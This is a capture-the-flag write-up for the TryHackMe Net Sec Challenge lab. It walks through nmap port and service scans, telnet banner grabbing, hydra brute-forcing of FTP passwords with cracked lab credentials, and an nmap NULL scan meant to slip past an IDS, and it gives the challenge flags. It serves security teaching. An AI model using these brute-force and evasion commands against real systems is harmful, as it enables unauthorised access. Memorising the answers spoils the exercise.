---
title: "Tryhackme - Net Sec Challenge"
date: 2025-01-17 12:00:00 -500 
categories: [Tryhackme, Net Sec Challenge]
tags: [ctf,exploit,flags,tryhackme,pentesting,net,sec]
author: Christoph K
---
[TryHackMe- Net Sec Challenge ](https://tryhackme.com/r/room/netsecchallenge)



## Introduction

In  this room we can practise our learning from the `Network Security` module. It presents the `Basisc` in `TCP/ UDP Protocols`, `Services/Ports` and `Encryption`.





    Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only nmap, telnet, and hydra.


## Tasks:

- What is the highest port number being open less than 10,000?
- There is an open port outside the common 1000 ports; it is above 10,000. What is it?
- How many TCP ports are open?
- What is the flag hidden in the HTTP server header?
- What is the flag hidden in the SSH server header?
- We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
- We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?
- Browsing to http://10.10.188.66:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?

#### What is the highest port number being open less than 10,000?

We just use basic `nmap` for that:

```bash

└─$ nmap 10.10.188.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 15:58 CET
Nmap scan report for 10.10.188.66
Host is up (0.037s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds

```

Answer: `8080`


#### There is an open port outside the common 1000 ports; it is above 10,000. What is it?

Now we add the `portrange` to `nmap`:

```bash
└─$ nmap 10.10.188.66 -p 10000-30000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 16:00 CET
Nmap scan report for 10.10.188.66
Host is up (0.038s latency).
Not shown: 20000 closed tcp ports (conn-refused)
PORT      STATE SERVICE
10021/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
```

Answer: `10021`

#### How many TCP ports are open?

We have the 5 ports from 1-10.000 and the high port 10021 but we can display them all:

```bash

└─$ nmap 10.10.188.66 -p 1-20000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 16:01 CET
Nmap scan report for 10.10.188.66
Host is up (0.038s latency).
Not shown: 19994 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
10021/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds
```
Answer: `6`

#### What is the flag hidden in the HTTP server header?

We connect via `telnet` to port 80 and make a `GET Request`:

```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ telnet 10.10.188.66 80
Trying 10.10.188.66...
Connected to 10.10.188.66.
Escape character is '^]'.
get flag.txt
GET / HTTP/1.1
host: telnet

HTTP/1.0 400 Bad Request
Content-Type: text/html
Content-Length: 345
Connection: close
Date: Sun, 19 Jan 2025 15:04:07 GMT
Server: lighttpd THM{web_server_25352}
```

Answer: `THM{web_server_25352}`

#### What is the flag hidden in the SSH server header?


For that we connect via `telnet` to port `22` (SSH)

```bash

┌──(admin㉿PREDATOR-01)-[~]
└─$ telnet 10.10.188.66 22
Trying 10.10.188.66...
Connected to 10.10.188.66.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 THM{946219583339}

```

#### We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

We can achieve that via `nmap` or `ftp`:

```bash
└─$ ftp 10.10.188.66 10021
Connected to 10.10.188.66.
220 (vsFTPd 3.0.5)
Name (10.10.188.66:admin):
```

`or`

```bash
└─$ sudo nmap -sS -sV 10.10.188.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 16:38 CET
Nmap scan report for 10.10.188.66
Host is up (0.042s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         (protocol 2.0)
80/tcp   open  http        lighttpd
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        Node.js (Express middleware)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.94SVN%I=7%D=1/19%Time=678D1C96%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\x20\r\n");
``` 

#### We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?

For that we can use `hydra` and a the password list `rockyou.txt`:

```bash
└─$ hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.188.66:10021
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-19 17:19:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.188.66:10021/
y[10021][ftp] host: 10.10.188.66   login: eddie   password: jordan
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-19 17:20:08
```


Okay we have credentials for `eddie`: 

`eddie:jordan`

Lets try to connect: 

```bash

└─$ ftp 10.10.154.154 10021
Connected to 10.10.154.154.
220 (vsFTPd 3.0.5)
Name (10.10.154.154:admin): eddie
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir

```

Okay it seems that the directory is empty. Lets try to bruteforce the user `quinn? :

```bash

└─$ hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.154.154:10021
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-19 18:24:15
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.154.154:10021/
[10021][ftp] host: 10.10.154.154   login: quinn   password: andrea
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-19 18:24:26

```

Now we have the credentials: 

`quinn:andrea`

Lets try to get the flag: 

```bash

┌──(admin㉿PREDATOR-01)-[~]
└─$ ftp 10.10.154.154 10021
Connected to 10.10.154.154.
220 (vsFTPd 3.0.5)
Name (10.10.154.154:admin): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||30371|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30153|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |***************************************************************************|    18       89.22 KiB/s    00:00 ETA
226 Transfer complete.
18 bytes received in 00:00 (0.47 KiB/s)
ftp> exit
221 Goodbye.

┌──(admin㉿PREDATOR-01)-[~]
└─$ ls
Desktop    Downloads     msfinstall  Pictures  reports         scripts    Videos
Documents  ftp_flag.txt  Music       Public    scipag_vulscan  Templates

┌──(admin㉿PREDATOR-01)-[~]
└─$ cat ftp_flag.txt
THM{321452667098}
```


Perfekt, we were able to connect via `FTP` and `get` the file. 

Answer: `THM{321452667098}`



#### Browsing to http://10.10.154.154:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?


    Your mission is to use Nmap to scan 10.10.154.154 (this machine)
    as covertly as possible and avoid being detected by the IDS.


We can use `NULL Scan` for that. The `NULL Scan` does not have a flag (SYN/ACK/RST) so it appears not to try to establish a connection. 

`sudo nmap -sN 10.10.154.54`

![result](assets/img/tryhackme/net_sec/01.png)


Answer: `THM{f7443f99}`



## Thoughts

A very easy and fun way to learn some protocols in "real life". It is very important, to understand how procotcols, connections and encryptions work. 

What did we learn today?
- using `nmap` with different `flags` to scan a target
- using `telnet` to extract `headers`
- using `hydra` to crack passwords

